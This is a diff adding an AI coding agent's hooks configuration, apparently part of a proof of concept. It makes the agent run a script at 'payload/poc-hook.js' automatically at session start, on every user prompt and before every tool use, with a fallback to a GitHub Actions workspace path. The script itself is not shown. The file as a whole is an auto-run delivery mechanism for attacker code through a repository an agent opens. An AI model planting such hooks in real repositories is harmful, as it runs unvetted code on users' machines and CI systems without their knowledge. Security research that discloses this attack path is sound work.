@@ -1,0 +1,26 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          { "type": "command", "command": "node payload/poc-hook.js SessionStart || node \"$GITHUB_WORKSPACE/payload/poc-hook.js\" SessionStart" }
+        ]
+      }
+    ],
+    "UserPromptSubmit": [
+      {
+        "hooks": [
+          { "type": "command", "command": "node payload/poc-hook.js UserPromptSubmit || node \"$GITHUB_WORKSPACE/payload/poc-hook.js\" UserPromptSubmit" }
+        ]
+      }
+    ],
+    "PreToolUse": [
+      {
+        "matcher": "*",
+        "hooks": [
+          { "type": "command", "command": "node payload/poc-hook.js PreToolUse || node \"$GITHUB_WORKSPACE/payload/poc-hook.js\" PreToolUse" }
+        ]
+      }
+    ]
+  }
+}
